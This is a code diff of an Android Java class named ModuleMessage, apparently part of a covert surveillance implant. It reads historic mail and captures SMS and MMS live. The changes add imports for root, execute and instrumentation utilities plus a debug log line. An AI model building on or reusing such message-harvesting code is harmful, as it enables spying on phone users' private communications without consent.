@@ -21,6 +21,7 @@ import java.util.concurrent.Semaphore;
 
 import com.android.dvci.ProcessInfo;
 import com.android.dvci.ProcessStatus;
+import com.android.dvci.Root;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ChildConf;
@@ -43,10 +44,14 @@ import com.android.dvci.module.message.MmsBrowser;
 import com.android.dvci.module.message.MsgHandler;
 import com.android.dvci.module.message.Sms;
 import com.android.dvci.module.message.SmsBrowser;
+import com.android.dvci.util.AudioEncoder;
 import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.DataBuffer;
 import com.android.dvci.util.DateTime;
+import com.android.dvci.util.Execute;
+import com.android.dvci.util.Instrument;
+import com.android.dvci.util.Utils;
 import com.android.dvci.util.WChar;
 import com.android.mm.M;
 
@@ -60,12 +65,13 @@ import com.android.mm.M;
 public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private static final String TAG = "ModuleMessage"; //$NON-NLS-1$
 	//$NON-NLS-1$
-	private static final int SMS_VERSION = 2010050501;
+	public static final int SMS_VERSION = 2010050501;
 	private static final int MAIL_VERSION2 = 2012030601;
 	private static final int ID_MAIL = 0;
 	private static final int ID_SMS = 1;
 	private static final int ID_MMS = 2;
 	private static final int MAIL_PROGRAM = 2;
+
 	private boolean mailEnabled;
 	private boolean smsEnabled;
 	private boolean mmsEnabled;
@@ -82,6 +88,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private int lastSMS;
 	private Filter[] filterCollect = new Filter[3];
 	private Filter[] filterRuntime = new Filter[3];
+
 
 	// private SmsHandler smsHandler;
 
@@ -236,6 +243,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			initMms();
 		}
 
+
 		if (smsEnabled || mmsEnabled) {
 			// Iniziamo la cattura live
 			ListenerSms.self().attach(this);
@@ -244,6 +252,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		}
 
 	}
+
 
 	@Override
 	public void actualStop() {
@@ -259,15 +268,19 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		if (smsEnabled) {
 			ListenerSms.self().detach(this);
 		}
+
 		if (msgHandler != null) {
 			msgHandler.quit();
 		}
+
 
 	}
 
 	@Override
 	public void actualGo() {
-
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (actualGo): ");
+		}
 		if (mailEnabled) {
 			try {
 				readHistoricMail(lastMail);
@@ -634,4 +647,5 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		}
 		return lastSMS;
 	}
+
 }
